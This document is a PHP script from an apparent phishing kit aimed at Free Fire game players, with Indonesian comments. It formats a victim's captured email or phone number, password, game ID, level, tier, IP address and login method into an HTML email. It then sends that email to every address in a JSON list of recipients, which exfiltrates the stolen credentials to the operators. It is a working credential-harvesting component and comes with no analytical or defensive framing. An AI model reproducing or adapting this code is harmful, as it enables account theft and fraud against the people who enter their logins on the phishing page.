<<?php

//mencegah masuk tanpa method get
if($email == "" && $total == ""){
$url = $_SERVER['PHP_SELF'];
header("Location: send.php");
}

//jenis ress
$coda = 'RESULT FAREL NESIA';
$spin = 'RESULT FAREL NESIA';
$claim = 'RESULT FAREL NESIA';

//jenis mail
$coda_mail = 'coda';
$spin_mail = 'spin';
$claim_mail = 'claim';

//get setting
include 'setting.php';

//method get
$total = '1';

//mengambil random isian
include 'log-cpr.php';
include 'log-ip.php';
$noperess = '08'.rand(1000000,9999999999);

$log=array("Facebook", "Google");
$random_log=array_rand($log,2);

//info sendmail
$emailku = $email;
$logress = $log[$random_log[0]];
$idress = rand(100000000,9999999999);
$subjek = "🇮🇩 [+62] FF LEVEL $level | ID $id LOG $logg ";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #3ABFFA;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
				border: 2px solid #3A3FFA;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #3A3FFA;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
}
</style>
</head>
<body>
<div class="result">
<table class="tblResult">
<tr>
<tr>
					<th style="text-align: center;" colspan="3"> Info Login </th>
				</tr>
				<tr>
					<td style="border-right: none;">Email/Phone</td>
					<td style="text-align: center;">$email</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$password</td>
				</tr>
               <tr> 
                    <td style="border-right: none;">Id</td>
					<td style="text-align: center;">$id</td>
				</tr>
               <tr>
                    <td style="border-right: none;">Level</td>
                    <td style="text-align: center;">$level</td>
                </tr>
                <tr>
                    <td style="border-right: none;">Tier</td>
                    <td style="text-align: center;">$tier</td>
                </tr>
                <tr>
					<td style="border-right: none;">IP Address</td>
					<td style="text-align: center;">$ipress</td>
				</tr>			
				<tr>
				   <td style="border-right: none;">Login</td>
                 <td style="text-align: center;">$logg</td>
                 </tr>
                  <tr>
					<th style="text-align: center;" colspan="3">&copy; Amang Nesia </th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;
				
include 'valzganteng/data.php'; //Wa RendzXD Nesia 088215771418
$sender = 'From: '.$nik.'<'.$sender.'>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";


$read = file_get_contents('valzganteng/data.json');
$json = json_decode($read,true);

for($i=0;$i<=count($json) - 1;$i++)
{
mail($json[$i]['email'], $subjek, $pesan, $headers);
}
?>